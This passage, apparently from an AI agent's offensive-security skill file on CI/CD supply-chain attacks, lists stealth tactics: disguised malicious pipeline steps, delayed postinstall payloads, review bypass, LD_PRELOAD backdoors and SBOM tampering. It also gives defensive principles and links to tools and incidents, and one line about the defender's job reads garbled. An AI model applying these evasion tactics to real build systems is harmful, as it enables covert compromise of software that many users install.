- **Modify pipeline in small increments**: Push small workflow changes over time; avoid diff detection.
- **Use legitimate-looking steps**: Add malicious step disguised as "security scan" or "lint".
- **Compromise shared runners**: Infect self-hosted runner; persistent across many pipelines.
- **Use scheduled workflows**: Trigger malicious workflow via cron schedule (off-hours).
- **Bypass required reviews**: Use admin tokens; push directly to main branch.

### Dependency Confusion Stealth
- **Use legitimate-looking package**: Match legitimate package metadata (README, license, author).
- **Multi-stage payload**: First version is benign; later version adds malicious `postinstall`.
- **Target internal package names**: Discover via job postings or GitHub leaks; register public version.
- **Time-delayed activation**: Malicious code activates only in production (detect environment).

### Build Artifact Stealth
- **Reproducible builds evasion**: Modify build to inject payload without changing hash.
- **Modify compiler**: Use Thompson's "Reflections on Trusting Trust" attack; backdoored compiler.
- **Patch binary post-build**: Modify binary after build; not in source control.
- **Backdoor libraries**: Modify shared library at runtime via LD_PRELOAD; bypass source-level audit.

### Source Code Stealth
- **Commit directly to release branch**: Skip main; avoid detection by PR-based monitoring.
- **Use git hooks**: Install malicious `.git/hooks/post-commit`; spread to other clones.
- **Compromise IDE plugins**: VS Code extension abuse; survives across projects.

### SBOM Evasion
- **Hide in transitive dependencies**: Don't be direct dependency; pull in via 3+ levels of indirection.
- **Use build-time only deps**: Don't appear in runtime SBOM (e.g., devDependencies).
- **Modify SBOM post-build**: Tamper with generated SBOM to hide malicious package.

## Hacker Laws

- **Trust Is a Vulnerability** — CI/CD is the system that *translates trust* (the developer's commit) into deployment (production). Every trust boundary in that translation (the runner, the build script, the dependency resolver, the signing key) is an attack surface. The build is where the assumption "this code came from who we think it did" becomes operationally load-bearing.
- **Assume Breach** — assume one of your dependencies is already backdoored. The xz-utils near-miss (March 2024) shows how close this comes to succeeding. Design for blast-radius containment: SBOMs, SLSA provenance, signed artifacts, admission control. The defender's job is to make the backdoor *unobservable at deploy time*, not invisible at install time.
- **The Build Is the Crown Jewel** — the runner has every secret, every signing key, every deploy token. Compromise the build once and you have compromised every artifact it will ever produce. The Codecov and SolarWinds incidents both followed this pattern.
- **Least Privilege for Runners** — a self-hosted runner that holds prod-deploy credentials is the single most valuable asset in the environment. Runners should be ephemeral, single-tenant, scoped to one repo, with the narrowest possible IAM role. A runner that needs prod-deploy should get it via short-lived OIDC, not a static kubeconfig.
- **Defense in Depth at Every Layer** — pre-commit hooks catch typosquatted imports; CI scanning catches dependency confusion; Sigstore admission control catches unsigned artifacts; SIEM rules catch runner egress anomalies. No single layer would have stopped xz-utils; the layering might.
- **People Are the Weakest Link** — the xz-utils backdoor was social engineering (the "Jia Tan" persona built trust over years). SolarWinds was a build-system compromise via an insider-adjacent path. Tooling alone does not defend against patient adversaries; the cultural discipline (review of long-term maintainers, suspicion of new "helpful" contributors) is the durable control.

## Cross-References

- **`skills/secret-management-attack/SKILL.md`** — overlaps on CI/CD secret theft; this skill goes further into build-system compromise and OIDC abuse
- **`skills/supply-chain-security/SKILL.md`** — defensive counterpart covering dependency scanning (Trivy, Dependabot, npm audit); this skill is the offensive complement
- **`skills/container-security/SKILL.md`** — runtime container protection; this skill covers build-time image compromise
- **`skills/cloud-native-vuln-research/SKILL.md`** — CVE research on K8s/etcd/containerd; this skill covers the Argo CD, Flux CD, Tekton deploy pipeline that pushes them
- **`skills/ad-cs-abuse/SKILL.md`** — PKI hierarchy abuse in AD; this skill treats Sigstore/cosign/in-toto as both attack target (steal signing key) and defense (provenance verification)
- **`skills/anti-forensics/SKILL.md`** — relevant when considering how defenders will reconstruct a build-system breach timeline
- **`skills/digital-forensics/SKILL.md`** — the defender counterpart; same artifact set (workflow logs, runner filesystem, registry metadata) is what an investigator examines
- **`skills/pentest-reporting/SKILL.md`** — report assembly with the masked-secret discipline required for CI/CD compromise findings
- **`skills/repo-scan/SKILL.md`** — codebase classification that informs the workflow-injection-sink surface

## Learning Resources

- **This skill's supplementary files**: `payloads.md`, `test-cases.md`
- **Deep-dive guides**:
  - `guides/ci-cd-supply-chain-attack-playbook.md` — end-to-end workflow from CI/CD recon through initial access, pipeline compromise, lateral movement, persistence, detection, and attestation
- **Tool homes**:
  - Jenkins CLI: [jenkins.io/doc/book/managing/cli](https://www.jenkins.io/doc/book/managing/cli/)
  - GitLab Runner: [docs.gitlab.com/runner](https://docs.gitlab.com/runner/)
  - GitHub Actions: [docs.github.com/actions](https://docs.github.com/actions)
  - CircleCI: [circleci.com/docs](https://circleci.com/docs/)
  - Argo CD: [argo-cd.readthedocs.io](https://argo-cd.readthedocs.io/)
  - Flux CD: [fluxcd.io/docs](https://fluxcd.io/docs/)
  - Tekton: [tekton.dev/docs](https://tekton.dev/docs/)
  - Sigstore/cosign: [sigstore.dev](https://sigstore.dev/)
  - in-toto: [in-toto.io](https://in-toto.io/)
  - SLSA: [slsa.dev](https://slsa.dev/)
  - OpenSSF Scorecard: [github.com/ossf/scorecard](https://github.com/ossf/scorecard)
  - StepSecurity Harden-Runner: [github.com/step-security/harden-runner](https://github.com/step-security/harden-runner)
  - Socket: [socket.dev](https://socket.dev/)
  - Syft: [github.com/anchore/syft](https://github.com/anchore/syft)
  - Grype: [github.com/anchore/grype](https://github.com/anchore/grype)
  - Snyk: [snyk.io](https://snyk.io/)
  - KICS: [kics.io](https://kics.io/)
  - Checkov: [checkov.io](https://www.checkov.io/)
- **Real-world references**:
  - SolarWinds SUNBURST (Dec 2020): [cisa.gov/news-events/cybersecurity-advisories/aa21-077a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-077a)
  - Codecov bash uploader (Apr 2021): [about.codecov.io/security-update](https://about.codecov.io/security-update/)
  - 3CX double-supply-chain (Mar 2023): [cisa.gov/news-events/alerts](https://www.cisa.gov/news-events/alerts/2023/04/20/)
  - xz-utils backdoor CVE-2024-3094 (Mar 2024): [nvd.nist.gov/vuln/detail/CVE-2024-3094](https://nvd.nist.gov/vuln/detail/CVE-2024-3094)
  - Alex Birsan dependency-confusion research (2021): [medium.com/@alex.birsan](https://medium.com/@alex.birsan)
  - event-stream incident (2018): [github.com/dominictarr/event-stream/issues/116](https://github.com/dominictarr/event-stream/issues/116)
  - ua-parser-js incident (2021): [github.com/faisalman/ua-parser-js/issues/536](https://github.com/faisalman/ua-parser-js/issues/536)
  - tj-actions/changed-files compromise (2025): [github.com/tj-actions/changed-files](https://github.com/tj-actions/changed-files)
  - Jenkins CVE-2024-23897: [jenkins.io/security/advisory/2024-01-24](https://www.jenkins.io/security/advisory/2024-01-24/)
  - Argo CD CVE-2022-24348: [github.com/argoproj/argo-cd/security/advisories/GHSA-63qx-x74g-jcr7](https://github.com/argoproj/argo-cd/security/advisories/GHSA-63qx-x74g-jcr7)
- **Core system files**: `SOUL.md`, `TOOLS.md`, `IDENTITY.md`
